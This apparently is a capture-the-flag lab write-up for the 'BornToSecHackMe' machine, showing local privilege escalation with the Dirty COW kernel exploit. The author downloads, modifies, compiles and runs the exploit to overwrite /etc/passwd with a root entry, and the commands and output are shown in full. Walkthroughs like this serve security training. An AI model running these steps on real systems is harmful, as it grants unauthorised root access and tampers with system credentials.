All previous steps are identical to those in solution 1, so we will start this solution from step 7.

## 7. Exploring the Target

After gaining initial access to the system, we check the system information using the `uname` command to learn more about the target environment.

```bash
www-data@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

The output reveals that the system is running on a 32-bit version of Ubuntu with kernel version `3.2.0-91`. A quick Google search shows that this kernel version is vulnerable to a well-known **Local Privilege Escalation** exploit known as **[CVE-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195)** (Dirty COW). This vulnerability affects Linux kernel versions from `2.x` to `4.x` before `4.8.3` and allows an unprivileged user to gain root privileges by exploiting a race condition.

## 8. Exploiting Dirty COW

To exploit this vulnerability, we will use an existing exploit written in C, which we can download and modify to escalate privileges.

```bash
www-data@BornToSecHackMe:~$ curl -O https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c
```

We downloaded the Dirty COW exploit from GitHub. Since the code references the username "firefart," we will replace all instances of "firefart" with "root" to modify the root account.

```bash
www-data@BornToSecHackMe:~$ sed -i 's/firefart/root/g' dirty.c
```

Next, we compile the C code using `gcc`:

```bash
www-data@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
```

We then run the exploit with a password of our choice (in this case, `"password"`):

```bash
www-data@BornToSecHackMe:~$ ./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
root:rox7Jdqy.byUU:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'password'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

The exploit successfully modifies the `/etc/passwd` file, adding a new root user with the password `"password"`. Now we can switch to the root user:

```bash
www-data@BornToSecHackMe:~$ su -
Password:
root@BornToSecHackMe:~#
```